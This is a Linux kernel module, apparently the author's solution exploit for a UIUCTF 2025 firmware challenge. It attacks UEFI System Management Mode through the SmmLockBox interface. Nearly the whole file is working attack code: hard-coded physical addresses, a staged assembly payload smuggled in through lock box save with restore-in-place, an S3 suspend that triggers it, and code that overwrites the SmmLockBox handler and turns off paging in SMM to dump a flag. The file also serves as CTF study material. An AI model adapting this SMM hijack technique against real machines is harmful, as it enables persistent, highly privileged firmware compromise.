// SPDX-License-Identifier: Apache-2.0
/*
 * Copyright 2025 Google LLC.
 */

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/efi.h>
#include <linux/suspend.h>
#include <asm/tlbflush.h>
#include <asm/io.h>

#define  BIT0     0x00000001
#define  BIT1     0x00000002
#define  BIT2     0x00000004
#define  BIT3     0x00000008
#define  BIT4     0x00000010
#define  BIT5     0x00000020
#define  BIT6     0x00000040
#define  BIT7     0x00000080

typedef u64 UINT64;
typedef u32 UINT32;
typedef u16 UINT16;
typedef u8 UINT8;
typedef unsigned long UINTN;

typedef void VOID;
typedef void *EFI_HANDLE;
typedef bool BOOLEAN;
typedef efi_status_t EFI_STATUS;
typedef UINTN EFI_PHYSICAL_ADDRESS;

typedef struct {
	UINTN                   Signature;
	EFI_HANDLE              SmmIplImageHandle;
	UINTN                   SmramRangeCount;
	void *SmramRanges;
	void *SmmEntryPoint;
	BOOLEAN                  SmmEntryPointRegistered;
	BOOLEAN                  InSmm;
	void *Smst;
	VOID                     *CommunicationBuffer;
	UINTN                    BufferSize;
	EFI_STATUS               ReturnStatus;
	EFI_PHYSICAL_ADDRESS     PiSmmCoreImageBase;
	UINT64                   PiSmmCoreImageSize;
	EFI_PHYSICAL_ADDRESS     PiSmmCoreEntryPoint;
} SMM_CORE_PRIVATE_DATA;

typedef struct {
	UINT32 Data1;
	UINT16 Data2;
	UINT16 Data3;
	UINT8 Data4[8];
} EFI_GUID;

typedef struct {
	EFI_GUID    HeaderGuid;
	UINTN       MessageLength;
	// UINT8       Data[1];
} EFI_SMM_COMMUNICATE_HEADER;

#define EFI_SMM_LOCK_BOX_COMMAND_SAVE                  0x1
#define EFI_SMM_LOCK_BOX_COMMAND_UPDATE                0x2
#define EFI_SMM_LOCK_BOX_COMMAND_RESTORE               0x3
#define EFI_SMM_LOCK_BOX_COMMAND_SET_ATTRIBUTES        0x4
#define EFI_SMM_LOCK_BOX_COMMAND_RESTORE_ALL_IN_PLACE  0x5

#define LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE  BIT0
#define LOCK_BOX_ATTRIBUTE_RESTORE_IN_S3_ONLY  BIT1

typedef struct {
	UINT32    Command;
	UINT32    DataLength;
	UINT64    ReturnStatus;
} EFI_SMM_LOCK_BOX_PARAMETER_HEADER;

typedef struct {
	EFI_SMM_LOCK_BOX_PARAMETER_HEADER    Header;
	EFI_GUID                             Guid;
	EFI_PHYSICAL_ADDRESS                 Buffer;
	UINT64                               Length;
} EFI_SMM_LOCK_BOX_PARAMETER_SAVE;

typedef struct {
	EFI_SMM_LOCK_BOX_PARAMETER_HEADER    Header;
	EFI_GUID                             Guid;
	UINT64                               Offset;
	EFI_PHYSICAL_ADDRESS                 Buffer;
	UINT64                               Length;
} EFI_SMM_LOCK_BOX_PARAMETER_UPDATE;

typedef struct {
	EFI_SMM_LOCK_BOX_PARAMETER_HEADER    Header;
	EFI_GUID                             Guid;
	EFI_PHYSICAL_ADDRESS                 Buffer;
	UINT64                               Length;
} EFI_SMM_LOCK_BOX_PARAMETER_RESTORE;

typedef struct {
	EFI_SMM_LOCK_BOX_PARAMETER_HEADER    Header;
	EFI_GUID                             Guid;
	UINT64                               Attributes;
} EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES;

typedef struct {
	EFI_SMM_LOCK_BOX_PARAMETER_HEADER    Header;
} EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE;

struct RtDataLayout {
	EFI_SMM_COMMUNICATE_HEADER header;
	union lockboxparam {
		EFI_SMM_LOCK_BOX_PARAMETER_SAVE save;
		EFI_SMM_LOCK_BOX_PARAMETER_UPDATE update;
		EFI_SMM_LOCK_BOX_PARAMETER_RESTORE restore;
		EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES setattr;
		EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE restoreall;
	} lockboxparam;
};

noinline __noclone
static void smi(void)
{
	__asm__ __volatile__(
		"xor %%eax,%%eax\n"
		"outb %%al,$0xB3\n"
		"outb %%al,$0xB2\n"
		"jmp 1f\n"
		"1:\n"
		::: "rax","memory"
	);
}

static unsigned long RtDataPhys = 0x000000000E8ED000;
static struct RtDataLayout *RtDataVirt;
static unsigned long PiSmmIplPhys = 0x0000EAC6000;
static void *PiSmmIplVirt;
static unsigned long S3Resume2PeiPhys = 0x00000852540;
static void *S3Resume2PeiVirt;

static unsigned long mSmmCorePrivateDataOffset = 0x7160;

static int __init lockbox(union lockboxparam *data)
{
	SMM_CORE_PRIVATE_DATA *gSmmCorePrivate =
		PiSmmIplVirt + mSmmCorePrivateDataOffset;

	RtDataVirt->header.HeaderGuid = (EFI_GUID)
		{ 0x2a3cfebd, 0x27e8, 0x4d0a, { 0x8b, 0x79, 0xd6, 0x88, 0xc2, 0xa3, 0xe1, 0xc0 }};
	RtDataVirt->header.MessageLength = sizeof(struct RtDataLayout);
	RtDataVirt->lockboxparam = *data;

	gSmmCorePrivate->CommunicationBuffer = (void *)RtDataPhys;
	gSmmCorePrivate->BufferSize = sizeof(EFI_SMM_COMMUNICATE_HEADER) +
		RtDataVirt->header.MessageLength;

	mb();
	smi();

	return 0;
}

__asm__ (
	/* Stage 2 Payload: Executed post-PEI while SMRAM open, overwrites
	   SmmLockBox code with stage 3 payload */
	"payload_stage2:                               \n"
	" pushf                                        \n"
	" push %rdi                                    \n"
	" push %rsi                                    \n"
	" push %rcx                                    \n"
	" lea payload_stage3(%rip),%rsi                \n"
	" mov $(0x0000FFDA000+0x0000000000002743),%rdi \n" // SmmLockBoxPhys + SmmLockBoxHandler
	" mov $(payload_end-payload_stage3),%rcx       \n"
	" rep movsb                                    \n"
	" pop %rcx                                     \n"
	" pop %rsi                                     \n"
	" pop %rdi                                     \n"
	" popf                                         \n"
	" push $(0x00000852540+0x00000000000029e0)     \n" // S3Resume2PeiPhys + jump target
	" ret                                          \n"

	/* Stage 3 Payload: Executed in SMM, disable paging */
	"payload_stage3:                               \n"
	// Switch to protected mode to disable paging
	" push $0x8                                    \n"
	" lea protectedmode(%rip),%rax                 \n"
	" push %rax                                    \n"
	" retfq                                        \n"
	"protectedmode: .code32                        \n"
	" mov $(0x80010033 - 0x80000000),%eax          \n"
	" mov %eax,%cr0                                \n"

	/* Stage 4 Payload: Executed in SMM without paging, dump flag */
	" mov $0x44440000,%esi                         \n"
	" mov $0x3f8,%dx                               \n"
	"print_loop:                                   \n"
	" lodsb                                        \n"
	" outb %al,(%dx)                               \n"
	" jmp print_loop                               \n"

	"payload_end: .code64                          \n"
);

extern char payload_stage2, payload_end;
static ptrdiff_t S3Resume2Pei_payload_off = 0x00000000000028b8;

static int __init exploit_init(void)
{
	pr_emerg("Fake flag: %s\n", (char *)ioremap(0x44440000, 0x1000));

	/* Stage 1 Payload: Load stage 2 into SmmLockBox as data */
	RtDataVirt = ioremap(RtDataPhys, 0x1000);
	PiSmmIplVirt = ioremap(PiSmmIplPhys, 0x10000);
	S3Resume2PeiVirt = ioremap(S3Resume2PeiPhys, 0x10000);

	memcpy(S3Resume2PeiVirt + S3Resume2Pei_payload_off, &payload_stage2,
		&payload_end-&payload_stage2);

	lockbox(&(union lockboxparam){ .save = {
		.Header.Command      = EFI_SMM_LOCK_BOX_COMMAND_SAVE,
		.Header.DataLength   = sizeof (EFI_SMM_LOCK_BOX_PARAMETER_SAVE),
		.Header.ReturnStatus = (UINT64)-1,
		.Guid                = (EFI_GUID)
			{ 0xda1a9002, 0x041b, 0x44b4, { 0xa9, 0x17, 0xfc, 0xe3, 0x89, 0xfd, 0x0a, 0xa1 }},
		.Buffer              = S3Resume2PeiPhys + S3Resume2Pei_payload_off,
		.Length              = &payload_end-&payload_stage2,
	}});

	lockbox(&(union lockboxparam){ .setattr = {
		.Header.Command      = EFI_SMM_LOCK_BOX_COMMAND_SET_ATTRIBUTES,
		.Header.DataLength   = sizeof (EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES),
		.Header.ReturnStatus = (UINT64)-1,
		.Guid                = (EFI_GUID)
			{ 0xda1a9002, 0x041b, 0x44b4, { 0xa9, 0x17, 0xfc, 0xe3, 0x89, 0xfd, 0x0a, 0xa1 }},
		.Attributes          = LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE,
	}});

	/* S3Resume2Pei loads SmmLockBox data and overwrites itself with
	   stage 2 payload, then proceed to execute it */
	pm_suspend(PM_SUSPEND_MEM);

	/* Could be any SMI pretty much */
	lockbox(&(union lockboxparam){ .restoreall = {
		.Header.Command      = EFI_SMM_LOCK_BOX_COMMAND_RESTORE_ALL_IN_PLACE,
		.Header.DataLength   = sizeof (EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE),
		.Header.ReturnStatus = (UINT64)-1,
	}});

	return 0;
}

module_init(exploit_init);

MODULE_AUTHOR("YiFei Zhu");
MODULE_DESCRIPTION("UIUCTF 2025");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");
